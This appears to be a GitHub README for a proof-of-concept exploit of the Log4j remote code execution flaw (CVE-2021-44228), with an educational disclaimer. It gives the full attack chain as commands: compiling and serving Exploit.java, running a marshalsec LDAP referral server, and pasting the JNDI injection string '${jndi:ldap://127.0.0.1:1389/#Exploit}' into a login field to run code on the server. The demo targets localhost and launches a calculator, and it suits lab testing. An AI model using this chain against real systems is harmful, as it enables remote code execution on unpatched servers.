# CVE-2021-44228 (Log4j Remote Code Execution)

## Disclaimer
All information and code is provided solely for educational purposes and/or testing your own systems for these vulnerabilities.

## Demo
https://user-images.githubusercontent.com/21955528/148373024-f6b65e50-8f44-4a65-8419-3ffd00febd05.mp4

## Usage
Clone the project:
```
git clone https://github.com/urossss/log4j-poc.git
```
Prepare the exploit:
```
cd log4j-poc/exploits
javac Exploit.java 
python3 -m http.server 8888
```
Start the LDAP server (default port is 1389):
```
cd tools
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8888/#Exploit"
```
Finally, start the vulnerable app server and client. In client login form, paste the JNDI injection in username field, for example ```${jndi:ldap://127.0.0.1:1389/#Exploit}```. The calculator will appear on the server side.
